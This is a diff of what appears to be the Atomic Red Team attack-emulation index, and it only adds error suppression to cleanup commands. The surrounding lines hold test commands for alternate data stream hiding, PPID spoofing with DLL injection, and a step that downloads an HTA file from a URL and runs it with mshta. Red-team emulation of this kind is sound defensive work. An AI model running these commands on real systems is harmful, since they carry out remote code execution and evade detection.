@@ -1726,7 +1726,7 @@ persistence:
           set-content -path #{file_name} -stream #{ads_filename} -value "test2"
           set-content -path . -stream #{ads_filename} -value "test3"
           ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname
-        cleanup_command: 'Remove-Item -Path #{file_name}
+        cleanup_command: 'Remove-Item -Path #{file_name} -ErrorAction Ignore
 
 '
   T1179:
@@ -8270,7 +8270,7 @@ defense-evasion:
           set-content -path #{file_name} -stream #{ads_filename} -value "test2"
           set-content -path . -stream #{ads_filename} -value "test3"
           ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname
-        cleanup_command: 'Remove-Item -Path #{file_name}
+        cleanup_command: 'Remove-Item -Path #{file_name} -ErrorAction Ignore
 
 '
   T1147:
@@ -9788,7 +9788,9 @@ defense-evasion:
           $var =Invoke-WebRequest "#{hta_url}"
           $var.content|out-file "#{temp_file}"
           mshta "#{temp_file}"
-        cleanup_command: "remove-item \"#{temp_file}\" \n"
+        cleanup_command: 'remove-item "#{temp_file}" -ErrorAction Ignore
+
+'
   T1096:
     technique:
       x_mitre_data_sources:
@@ -10322,9 +10324,9 @@ defense-evasion:
           . $PathToAtomicsFolder\T1502\src\PPID-Spoof.ps1
           $ppid=Get-Process #{parent_process_name} | select -expand id
           PPID-Spoof -ppid $ppid -spawnto "#{spawnto_process_path}" -dllpath "#{dll_path}"
-        cleanup_command: |-
-          Stop-Process -Name "#{dll_process_name}"
-          Stop-Process -Name "#{spawnto_process_name}"
+        cleanup_command: |
+          Stop-Process -Name "#{dll_process_name}" -ErrorAction Ignore
+          Stop-Process -Name "#{spawnto_process_name}" -ErrorAction Ignore
   T1150:
     technique:
       x_mitre_data_sources:
@@ -14136,9 +14138,9 @@ privilege-escalation:
           . $PathToAtomicsFolder\T1502\src\PPID-Spoof.ps1
           $ppid=Get-Process #{parent_process_name} | select -expand id
           PPID-Spoof -ppid $ppid -spawnto "#{spawnto_process_path}" -dllpath "#{dll_path}"
-        cleanup_command: |-
-          Stop-Process -Name "#{dll_process_name}"
-          Stop-Process -Name "#{spawnto_process_name}"
+        cleanup_command: |
+          Stop-Process -Name "#{dll_process_name}" -ErrorAction Ignore
+          Stop-Process -Name "#{spawnto_process_name}" -ErrorAction Ignore
   T1150:
     technique:
       x_mitre_data_sources:
@@ -21837,7 +21839,9 @@ execution:
           $var =Invoke-WebRequest "#{hta_url}"
           $var.content|out-file "#{temp_file}"
           mshta "#{temp_file}"
-        cleanup_command: "remove-item \"#{temp_file}\" \n"
+        cleanup_command: 'remove-item "#{temp_file}" -ErrorAction Ignore
+
+'
   T1086:
     technique:
       x_mitre_permissions_required:
